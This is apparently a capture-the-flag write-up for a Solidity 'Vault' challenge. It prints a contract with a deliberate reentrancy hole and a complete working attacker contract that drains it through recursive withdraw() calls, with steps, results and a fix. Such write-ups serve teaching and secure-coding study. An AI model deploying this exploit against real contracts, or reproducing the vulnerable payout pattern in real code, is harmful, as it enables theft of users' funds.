# Corvid Savings Vault — classic reentrancy (Black Hat India 2026 CTF)

**Flag:** `BlackHatIndia{r3_3nt3r3d_th3_v4ult_b3f0r3_th3_b4l4nc3_h1t_z3r0_d41f2731}`

## Prompt (paraphrased)

A pooled savings `Vault`: `deposit()` any amount, `withdraw()` your whole
balance any time. Three early customers already parked 10 ETH total. The
developer was proud that smart-contract wallets "get paid out instantly."
Empty the vault.

## Source

```solidity
contract Vault {
    mapping(address => uint256) public balances;

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");

        // Pay out first so smart-contract wallets get their ETH right away...
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");

        // ...then clear the balance.
        balances[msg.sender] = 0;
        emit Withdrawal(msg.sender, amount);
    }
    ...
}
```

`Setup.sol` seeds the vault with 10 ETH across three pre-funded customer
balances (4 + 3.5 + 2.5 ETH).

## Vulnerability

Textbook checks-effects-interactions violation: `withdraw()` sends ETH via
a raw `call` **before** zeroing `balances[msg.sender]`. The flavor text
("pays smart-contract wallets instantly") is the tell — paying out via a
raw `call` to a contract address triggers that contract's `receive()`
fallback *during* the external call, while the balance is still
non-zero, so it can call `withdraw()` again recursively.

## Exploit

```solidity
interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Reenter {
    IVault public immutable vault;
    address public owner;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "need seed deposit");
        vault.deposit{value: msg.value}();
        vault.withdraw();
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    receive() external payable {
        if (address(vault).balance >= 0.1 ether) {
            vault.withdraw();
        }
    }
}
```

1. Deploy `Reenter` with the vault's address.
2. Call `attack()` with a small seed deposit (1 ETH used here).
3. `attack()` deposits, then calls `withdraw()`. Each time `withdraw()`
   pays out, `receive()` fires and calls `withdraw()` again — because the
   balance mapping hasn't been zeroed yet — draining the vault's whole
   balance (the attacker's own deposit plus all three pre-funded
   customers' ETH) before any `balances[...] = 0` write ever lands.
4. After the recursive drain unwinds, `attack()` sweeps the contract's
   full ETH balance to the player.

One `attack()` transaction (11 nested `withdraw()` calls, visible in the
event log) drained the vault from 10 ETH to 0, flipping
`Setup.isSolved()` to `true`.

## Lesson

Always follow checks-effects-interactions: update internal state (zero
the balance) **before** making any external call/transfer, not after.
Alternatively use a reentrancy guard (`nonReentrant` modifier) or the
pull-payment pattern.
